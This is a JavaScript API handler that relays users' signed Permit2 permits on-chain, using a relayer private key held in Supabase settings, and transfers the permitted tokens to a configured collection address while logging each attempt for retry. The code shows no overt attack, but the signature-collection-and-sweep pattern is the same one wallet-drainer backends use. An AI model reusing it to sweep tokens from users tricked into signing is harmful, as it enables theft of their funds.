/**
 * POST /api/collect-permit2
 * Uses settings from Supabase (rpc, private key, collection address).
 * Saves every attempt to payments table for dashboard + retry.
 */

import { ethers } from 'ethers';
import { getSupabase, getSettings, cors } from '../lib/supabase.js';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const PERMIT2_ABI = [
  `function permitTransferFrom(
    ((address token, uint256 amount) permitted, address spender, uint256 nonce, uint256 deadline) permit,
    (address to, uint256 requestedAmount) transferDetails,
    address owner,
    bytes signature
  )`
];

export default async function handler(req, res) {
  cors(res);
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  let paymentId = null;

  try {
    const { permit, signature, owner, amount, chainId } = req.body || {};

    if (!permit || !signature || !owner || !amount) {
      return res.status(400).json({ error: 'Missing required fields: permit, signature, owner, amount' });
    }

    const supabase = getSupabase();
    const settings = await getSettings(supabase);

    const rpcUrl = settings.rpc_url || process.env.RPC_URL;
    const privateKey = settings.relayer_private_key || process.env.RELAYER_PRIVATE_KEY;
    const collectionAddress = settings.collection_address || process.env.COLLECTION_ADDRESS;

    if (!rpcUrl || !privateKey || !collectionAddress) {
      return res.status(500).json({
        error: 'Server misconfigured. Set RPC, private key, and collection address in Admin → Settings.'
      });
    }

    // Log payment as pending first
    const { data: inserted, error: insertErr } = await supabase
      .from('payments')
      .insert({
        owner_address: owner.toLowerCase(),
        amount: String(amount),
        chain_id: chainId || settings.chain_id || 1,
        permit,
        signature,
        status: 'pending'
      })
      .select('id')
      .single();

    if (insertErr) console.error('payment insert error', insertErr);
    paymentId = inserted?.id || null;

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const relayer = new ethers.Wallet(privateKey, provider);

    if (permit.spender.toLowerCase() !== relayer.address.toLowerCase()) {
      if (paymentId) {
        await supabase.from('payments').update({
          status: 'failed',
          error_message: `Spender mismatch: ${permit.spender} != ${relayer.address}`,
          updated_at: new Date().toISOString()
        }).eq('id', paymentId);
      }
      return res.status(400).json({
        error: `Spender mismatch. Signed spender ${permit.spender} != relayer ${relayer.address}`
      });
    }

    const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayer);

    const transferDetails = {
      to: collectionAddress,
      requestedAmount: amount
    };

    const tx = await permit2.permitTransferFrom(
      {
        permitted: {
          token: permit.permitted.token,
          amount: permit.permitted.amount
        },
        spender: permit.spender,
        nonce: permit.nonce,
        deadline: permit.deadline
      },
      transferDetails,
      owner,
      signature
    );

    const receipt = await tx.wait();

    if (paymentId) {
      await supabase.from('payments').update({
        status: 'success',
        tx_hash: receipt.hash,
        error_message: null,
        updated_at: new Date().toISOString()
      }).eq('id', paymentId);
    }

    return res.status(200).json({
      success: true,
      txHash: receipt.hash,
      blockNumber: receipt.blockNumber,
      paymentId
    });
  } catch (err) {
    console.error('collect-permit2 error:', err);
    try {
      if (paymentId) {
        const supabase = getSupabase();
        await supabase.from('payments').update({
          status: 'failed',
          error_message: err.shortMessage || err.message || 'Transaction failed',
          updated_at: new Date().toISOString()
        }).eq('id', paymentId);
      }
    } catch (_) {}

    return res.status(500).json({
      error: err.shortMessage || err.message || 'Transaction failed',
      paymentId
    });
  }
}
